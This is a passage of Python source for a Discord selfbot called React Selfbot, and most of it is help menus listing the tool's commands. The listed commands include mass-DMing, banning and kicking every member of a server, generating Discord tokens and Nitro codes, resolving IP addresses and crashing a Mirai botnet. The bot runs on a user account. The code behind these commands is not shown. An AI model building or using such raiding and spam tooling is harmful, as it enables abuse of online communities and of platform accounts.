        await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def server(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}dmall <Text>** | DM's all users on the server with the specified message
        **{prefix}banall** | Bans all users on the server except yourself
        **{prefix}kickall** | Kicks all users on the server except yourself
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available Server Commands')
        await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def info(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}avatar [User]** | Shows user's avatar
        **{prefix}serverlogo [Server ID]** | Shows server's logo
        **{prefix}roleinfo <Role>** | Shows role information
        **{prefix}serverinfo [Server ID]** | Shows server information
        **{prefix}userinfo [User]** | Shows user information
        **{prefix}btc/bitcoin** | Shows the current Price of Bitcoin in USD, EUR and GBP
        **{prefix}eth/ethereum** | Shows the current Price of Ethereum in USD, EUR and GBP
        **{prefix}ltc/litecoin** | Shows the current Price of Litecoin in USD, EUR and GBP
        **{prefix}xmr/monero** | Shows the current Price of Monero in USD, EUR and GBP
        **{prefix}covid** | Shows live COVID-19 stats
        **{prefix}pcspecs** | Sends your PC specifications
        **{prefix}urbandict <Word>** | Shows the urban definition of a word
        **{prefix}calc <Equation>** | Calculates the mathematical answer of an equation
        **{prefix}namehistory <Minecraft Username>** | Shows the name history of a Minecraft account
        **{prefix}uselessfact** | Shows a random useless fact
        **{prefix}pokedex <PokÃ©mon>** | Shows PokÃ©dex information about a PokÃ©mon
        **{prefix}ping** | Shows your latency
        **{prefix}ipresolve <IP Address>** | Resolves an IP Address
        **{prefix}fnstats <Fortnite Name>** | Shows the Fortnite stats of an user
        **{prefix}rockstarid <SocialClub Name>** | Resolves Social Club's Rockstar ID of a user
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available Info Commands')
        await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def fun(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}token** | Generates a random Discord token
        **{prefix}coinflip** | Flips a Coin
        **{prefix}cocksize <Users>** | Do a Cock comparison
        **{prefix}8ball <Question>** | Ask the Magic 8 ball
        **{prefix}dadjoke** | Tells a dad joke
        **{prefix}joke** | Tells a joke
        **{prefix}howgay <User>** | Shows how gay a user is
        **{prefix}howfurry <User>** | Shows how forry a user is
        **{prefix}fakedata** | Generates a fake identity
        **{prefix}911** | Sends a short 9/11 animation
        **{prefix}choose <Option 1> <Option 2>** | Takes a random choice between two options
        **{prefix}deathdate <User>** | Shows the Death Date of a user
        **{prefix}nitro <Amount>** | Generates Nitro Codes
        **{prefix}amazonsearch <Product>** | Searches Amazon products
        **{prefix}youtubesearch <Search>** | Searches YouTube videos
        **{prefix}pornhubsearch <Search>** | Searches PornHub videos
        **{prefix}lmgtfy <Search>** | Sends a Let Me Google That For You Link
        **{prefix}miraicrash <IP Address> <Port>** | Crashes a Mirai Botnet
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available Fun Commands')
        await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def user(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}playing <Status>** | Sets your playing status
        **{prefix}streaming <Status>** | Sets your streaming status
        **{prefix}listening <Status>** | Sets your listening status
        **{prefix}watching <Status>** | Sets your watching status
        **{prefix}online** | Sets your status to online
        **{prefix}idle** | Sets your status to idle
        **{prefix}dnd** | Sets your status to do not disturb
        **{prefix}invisible** | Sets your status to invisible
        **{prefix}removestatus** | Removes your status
        **{prefix}typing** | Shows typing... message for 1 hour
        **{prefix}invisiblenickname** | Changes your nickname to invisible letters
        **{prefix}junknickname** | Changes your nickname to junk letters
        **{prefix}hypesquad <Bravery/Balance/Brilliance>** | Changes your HypeSuqad House
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available User Commands')
        await ctx.send(embed=em, delete_after=delete_timeout)

    @bot.command()
    async def image(ctx):
        await ctx.message.delete()
        em = discord.Embed(colour=embed_color, description=
        f'''
        {global_emoji} **React Selfbot** {global_emoji}
        **{prefix}fox** | Sends a random fox image
        **{prefix}duck** | Sends a random duck image
        **{prefix}dog** | Sends a random dog image
        **{prefix}cat** | Sends a random cat image
        **{prefix}panda** | Sends a random panda image
        **{prefix}koala** | Sends a random koala image
        **{prefix}pikachu** | Sends a random pikachu image
        **{prefix}hug** | Sends a random hug gif
        **{prefix}wink** | Sends a random wink image
        ''', timestamp=date.datetime.utcfromtimestamp(time.time()))
        em.set_thumbnail(url=embed_thumbnail_url)
        em.set_footer(text=embed_footer)
        em.set_author(name='Available Image Commands')
        await ctx.send(embed=em, delete_after=delete_timeout)

    bot.run(json.load(open('config.json'))['token'], bot=False)
    os.system("pause")
elif authresponse['success'] == False and authresponse['error'] == 'HWIDError':
    print('Wrong HardwareID')
    os.system("pause")
elif authresponse['success'] == False and authresponse['error'] == 'InvalidUser':
    print('Invalid User')
    os.system("pause")
else:
    print('An Error occured')
    os.system("pause")'
